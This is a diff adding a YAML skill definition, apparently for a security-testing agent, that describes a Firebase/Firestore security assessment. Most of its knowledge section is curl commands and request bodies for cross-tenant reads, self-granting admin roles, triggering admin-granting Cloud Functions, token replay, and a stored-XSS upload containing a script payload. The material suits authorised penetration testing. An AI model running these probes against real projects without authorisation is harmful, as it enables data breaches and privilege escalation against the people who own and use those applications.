@@ -1,0 +1,107 @@
+schema_version: 1
+version: 3.0.0
+name: firebase-security
+description: >
+  Comprehensive Firebase / Firestore / Realtime Database / Cloud Storage / Cloud Functions
+  security assessment. Covers misconfigured security rules, cross-tenant data access,
+  Cloud Functions privilege escalation, App Check bypass, and signed URL abuse.
+triggers:
+  - firebase
+  - firestore
+  - realtime database
+  - cloud functions
+  - firebase rules
+  - app check
+  - firebase storage
+  - firebaseio
+  - google firebase
+  - firebase misconfiguration
+  - baas
+tools:
+  - curl
+  - httpx
+  - python3
+knowledge: |
+  Firebase security spans three independent rule engines (Firestore, Realtime DB, Storage),
+  Cloud Functions that bypass rules when using Admin SDK, and ID token validation in consuming APIs.
+  Rules are NOT filters — a query must satisfy constraints that make the rule true for all returned documents.
+
+  1. CONFIG EXTRACTION & PRINCIPAL COLLECTION:
+     From client JS bundle or mobile app:
+       firebase.apps[0].options  →  apiKey, authDomain, projectId, appId, storageBucket
+     Obtain tokens for: unauthenticated, anonymous (if enabled), User-A, User-B, staff/admin.
+     Capture ID tokens via browser devtools (Network → Authorization header) or Firebase emulator.
+
+  2. FIRESTORE RULES AUDIT:
+     Common misconfigurations:
+       allow read: if request.auth != null   →  ANY authenticated user reads ALL data
+       allow write: if request.auth != null  →  mass write by any user
+       Missing field validation              →  can add isAdmin/role/tenantId fields
+     REST API probing (bypasses SDK client-side constraints):
+       curl -s "https://firestore.googleapis.com/v1/projects/PROJECT/databases/(default)/documents/COLLECTION" \
+         -H "Authorization: Bearer USER_A_TOKEN"
+     Cross-tenant test — try query with foreign org filter:
+       curl -s "https://firestore.googleapis.com/v1/projects/PROJECT/databases/(default)/documents:runQuery" \
+         -H "Authorization: Bearer USER_A_TOKEN" -H "Content-Type: application/json" \
+         -d '{"structuredQuery":{"from":[{"collectionId":"orders"}],"where":{"fieldFilter":{"field":{"fieldPath":"orgId"},"op":"EQUAL","value":{"stringValue":"ORG_B_ID"}}}}}'
+     Write-path privilege escalation:
+       PATCH /v1/projects/PROJECT/databases/(default)/documents/users/USER_ID \
+         -d '{"fields":{"isAdmin":{"booleanValue":true},"role":{"stringValue":"admin"}}}'
+
+  3. REALTIME DATABASE EXPOSURE:
+     Root probe (should always return 401/permission-denied):
+       curl -s "https://PROJECT.firebaseio.com/.json"
+       curl -s "https://PROJECT.firebaseio.com/.json?auth=USER_A_TOKEN"
+     Node-level tests:
+       curl -s "https://PROJECT.firebaseio.com/users.json?auth=USER_A_TOKEN"
+       curl -s "https://PROJECT.firebaseio.com/admin.json?auth=USER_A_TOKEN"
+     Write privilege flag:
+       curl -s -X PUT "https://PROJECT.firebaseio.com/users/USER_B_ID/role.json?auth=USER_A_TOKEN" \
+         -d '"admin"'
+
+  4. CLOUD STORAGE ABUSE:
+     Public read probe:
+       curl -s "https://storage.googleapis.com/storage/v1/b/PROJECT.appspot.com/o" \
+         -H "Authorization: Bearer USER_A_TOKEN"
+     List objects (prefix enumeration):
+       curl -s "https://storage.googleapis.com/storage/v1/b/BUCKET/o?prefix=users/"
+     Signed URL reuse across accounts:
+       Capture signed URL for User-A's file; attempt to access User-B's file path via the same token
+     HTML/SVG upload for stored XSS:
+       curl -s -X POST "https://storage.googleapis.com/upload/storage/v1/b/BUCKET/o?uploadType=media&name=xss.html" \
+         -H "Content-Type: text/html" -d '<script>alert(1)</script>'
+
+  5. CLOUD FUNCTIONS EXPLOITATION:
+     onCall vs onRequest parity gap:
+       a. Call onCall endpoint without auth token (context.auth should be null/undefined)
+       b. Call with wrong audience token (project mismatch)
+       c. Pass uid/orgId in request body that differs from context.auth.uid
+     Trigger-based privilege escalation:
+       Create a document that triggers an onCreate/onWrite Cloud Function granting admin role:
+         POST /v1/projects/PROJECT/databases/(default)/documents/role_requests \
+           -d '{"fields":{"targetRole":{"stringValue":"admin"},"userId":{"stringValue":"ATTACKER_ID"}}}'
+
+  6. AUTH TOKEN PITFALLS:
+     Accepting wrong audience/project — replay token across environments:
+       curl -s https://STAGING.firebaseapp.com/api/protected \
+         -H "Authorization: Bearer PROD_USER_TOKEN"
+     Trusting uid from request body: POST /update with {"uid": "victim_uid"} instead of server-side context.auth.uid
+     App Check bypass: REST calls to googleapis directly succeed with only an ID token, no App Check header
+
+  7. TENANT ISOLATION TESTS:
+     Fix one user's ID token, vary org header/subdomain/query param:
+       curl -s "https://api.app.com/orgs/OTHER_ORG/data" \
+         -H "Authorization: Bearer USER_A_TOKEN" \
+         -H "X-Organization-ID: OTHER_ORG"
+     Export/report functions: verify that bulk data export queries execute under caller scope, not server-wide.
+
+  IMPACT: Cross-tenant data breach, privilege escalation via rule misconfig, mass data read/write,
+  stored XSS via Storage uploads, RCE via Function triggers with admin SDK.
+references:
+  - https://firebase.google.com/docs/rules/rules-and-auth
+  - https://cloud.google.com/functions/docs/securing/authenticating
+  - https://attack.mitre.org/techniques/T1078/004/
+  - https://owasp.org/www-project-top-ten/
+provenance:
+  origin: builtin
+  source: persona/v0.1/skills/firebase-security.yaml
